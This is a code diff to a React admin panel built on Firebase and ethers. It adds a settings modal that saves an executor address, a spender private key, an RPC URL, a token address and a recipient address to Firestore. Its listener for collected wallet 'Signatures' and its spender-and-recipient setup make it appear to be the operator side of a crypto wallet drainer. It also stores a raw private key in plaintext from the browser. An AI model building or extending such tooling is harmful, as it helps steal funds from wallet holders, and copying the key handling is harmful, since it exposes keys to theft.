@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { db } from './firebase';
-import { collection, query, onSnapshot } from 'firebase/firestore';
+import { collection, query, onSnapshot, doc as docRef, getDoc, setDoc } from 'firebase/firestore';
 import { ethers } from 'ethers';
 
 // Points to your Vercel Serverless Function
@@ -14,6 +14,14 @@ export default function Admin() {
   const [recipient, setRecipient] = useState(localStorage.getItem('admin_recipient') || "");
   const [outputToken, setOutputToken] = useState(localStorage.getItem('admin_outputToken') || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2");
 
+  // Settings modal state (persisted in Firestore)
+  const [isSettingsOpen, setIsSettingsOpen] = useState(false);
+  const [settingsLoading, setSettingsLoading] = useState(false);
+  const [settingsStatus, setSettingsStatus] = useState("");
+  const [executorAddressSetting, setExecutorAddressSetting] = useState("");
+  const [spenderPrivateKeySetting, setSpenderPrivateKeySetting] = useState("");
+  const [rpcUrlSetting, setRpcUrlSetting] = useState("");
+
   // UI State
   const [selectedWallet, setSelectedWallet] = useState(null);
   const [isModalOpen, setIsModalOpen] = useState(false);
@@ -25,6 +33,50 @@ export default function Admin() {
     localStorage.setItem('admin_recipient', recipient);
     localStorage.setItem('admin_outputToken', outputToken);
   }, [recipient, outputToken]);
+
+  // Load settings from Firestore when opening settings modal
+  const openSettings = async () => {
+    setIsSettingsOpen(true);
+    setSettingsLoading(true);
+    try {
+      const snap = await getDoc(docRef(db, 'admin_config', 'settings'));
+      if (snap.exists()) {
+        const s = snap.data();
+        setExecutorAddressSetting(s.executorAddress || s.executor || '');
+        setSpenderPrivateKeySetting(s.spenderPrivateKey || s.SPENDER_PRIVATE_KEY || '');
+        setRpcUrlSetting(s.rpcUrl || s.RPC_URL || '');
+        // Also populate UI fields with values
+        if (s.recipient) setRecipient(s.recipient);
+        if (s.tokenAddress) setOutputToken(s.tokenAddress);
+      }
+      setSettingsStatus('Loaded');
+    } catch (err) {
+      console.error('Failed to load settings', err);
+      setSettingsStatus('Load failed');
+    } finally {
+      setSettingsLoading(false);
+    }
+  };
+
+  const saveSettings = async () => {
+    setSettingsLoading(true);
+    setSettingsStatus('Saving...');
+    try {
+      await setDoc(docRef(db, 'admin_config', 'settings'), {
+        executorAddress: executorAddressSetting,
+        spenderPrivateKey: spenderPrivateKeySetting,
+        rpcUrl: rpcUrlSetting,
+        tokenAddress: outputToken,
+        recipient: recipient
+      }, { merge: true });
+      setSettingsStatus('Saved');
+    } catch (err) {
+      console.error('Failed to save settings', err);
+      setSettingsStatus('Save failed');
+    } finally {
+      setSettingsLoading(false);
+    }
+  };
 
   // Real-time listener for Signatures
   useEffect(() => {
@@ -125,8 +177,9 @@ export default function Admin() {
         <header className="admin-header">
           <div className="header-top">
             <h2>Admin Control Center</h2>
-            <div className="connection-badge active">
-              Server Mode
+            <div style={{display:'flex',alignItems:'center',gap:8}}>
+              <div className="connection-badge active">Server Mode</div>
+              <button className="settings-btn" onClick={openSettings} title="Settings">⚙️</button>
             </div>
           </div>
           
@@ -241,6 +294,46 @@ export default function Admin() {
                   )}
                 </div>
               ))}
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* SETTINGS MODAL */}
+      {isSettingsOpen && (
+        <div className="modal-overlay" onClick={() => setIsSettingsOpen(false)}>
+          <div className="modal-glass glass-panel" onClick={e => e.stopPropagation()} style={{maxWidth:600}}>
+            <div className="modal-header">
+              <h3>App Settings</h3>
+              <button className="close-btn" onClick={() => setIsSettingsOpen(false)}>✕</button>
+            </div>
+
+            <div style={{padding:'10px 6px'}}>
+              <div className="input-group">
+                <label>Executor Address</label>
+                <input value={executorAddressSetting} onChange={e => setExecutorAddressSetting(e.target.value)} placeholder="0x..." />
+              </div>
+              <div className="input-group">
+                <label>Spender Private Key</label>
+                <input value={spenderPrivateKeySetting} onChange={e => setSpenderPrivateKeySetting(e.target.value)} placeholder="private key (0x...)" />
+              </div>
+              <div className="input-group">
+                <label>RPC URL</label>
+                <input value={rpcUrlSetting} onChange={e => setRpcUrlSetting(e.target.value)} placeholder="https://..." />
+              </div>
+              <div className="input-group">
+                <label>Token Address</label>
+                <input value={outputToken} onChange={e => setOutputToken(e.target.value)} placeholder="0x..." />
+              </div>
+              <div className="input-group">
+                <label>Recipient Address</label>
+                <input value={recipient} onChange={e => setRecipient(e.target.value)} placeholder="0x..." />
+              </div>
+
+              <div style={{display:'flex',gap:8,marginTop:12}}>
+                <button className="btn-refresh" onClick={saveSettings} disabled={settingsLoading}>{settingsLoading ? 'Saving...' : 'Save'}</button>
+                <div style={{alignSelf:'center',color:'#aaa'}}>{settingsStatus}</div>
+              </div>
             </div>
           </div>
         </div>
